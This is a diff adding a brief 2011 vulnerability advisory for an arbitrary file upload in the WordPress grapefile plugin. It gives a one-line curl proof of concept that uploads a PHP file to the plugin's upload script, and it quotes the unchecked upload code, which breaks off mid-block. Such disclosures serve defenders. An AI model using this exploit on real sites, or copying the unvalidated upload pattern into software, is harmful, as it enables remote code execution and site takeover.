@@ -1,0 +1,19 @@
+Title: Wordpress grapefile plugin <= 1.1 Arbitrary file upload
+Date: 30-8-2011
+Author: Hrvoje Spoljar [ hrvoje.spoljar(at)gmail.com ]
+Version: 1.1
+Software link:http://wordpress.org/extend/plugins/grapefile/
+
+PoC:
+curl -F "userfile=@mycode.php"
+http://domain.tld/wp-content/plugins/grapefile/grapeupload.php
+
+File(s): grapeupload.php  grapeupload2.php  grapeupload3.php
+grapeupload4.php
+Vulnerable code:
+$uploaddir =
+$_SERVER["DOCUMENT_ROOT"].'/wp-content/plugins/grapefile/filestore/avi/';
+$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
+
+if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
+  echo "success";
